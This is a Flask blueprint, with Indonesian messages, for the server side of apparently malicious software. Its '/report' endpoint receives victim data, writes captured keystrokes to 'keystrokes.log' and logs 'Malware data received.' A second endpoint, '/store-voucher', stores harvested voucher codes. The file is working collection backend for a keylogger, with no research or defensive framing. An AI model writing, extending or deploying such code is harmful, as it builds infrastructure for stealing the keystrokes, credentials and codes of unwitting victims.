from flask import Blueprint, request, jsonify, current_app
import os, json
from datetime import datetime
from ..utils import ensure_log_directory

report_bp = Blueprint('report', __name__, url_prefix='/api/monitoring')

@report_bp.route('/report', methods=['POST'])
def report():
    data = request.json
    log_dir = ensure_log_directory()

    traffic_log = os.path.join(log_dir, 'traffic.json')
    keystroke_log = os.path.join(log_dir, 'keystrokes.log')

    data.setdefault("timestamp", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    with open(traffic_log, "a") as f:
        f.write(json.dumps(data) + "\n")

    if "data" in data:
        with open(keystroke_log, "a") as f:
            f.write(f"[Timestamp: {data['timestamp']}]\n")
            for key, val in data["data"].items():
                f.write(f"{key}: {val}\n")
            f.write("\n")

    current_app.logger.info("Malware data received.")
    return jsonify({"status": "Received"}), 200

@report_bp.route('/store-voucher', methods=['POST'])
def store_voucher():
    try:
        data = request.get_json()
        code = data.get('voucher_code', '').strip().upper()
        if not code:
            return jsonify({'status': 'error', 'message': 'Voucher kosong'}), 400

        log_dir = ensure_log_directory()
        voucher_path = os.path.join(log_dir, 'voucher_codes.txt')

        # Cegah duplikasi
        if os.path.exists(voucher_path):
            with open(voucher_path, 'r') as f:
                existing = [v.strip().upper() for v in f.readlines()]
            if code in existing:
                return jsonify({'status': 'exists', 'message': 'Voucher sudah tersimpan'}), 200

        with open(voucher_path, 'a') as f:
            f.write(code + '\n')

        return jsonify({'status': 'success', 'message': 'Voucher disimpan'}), 200

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

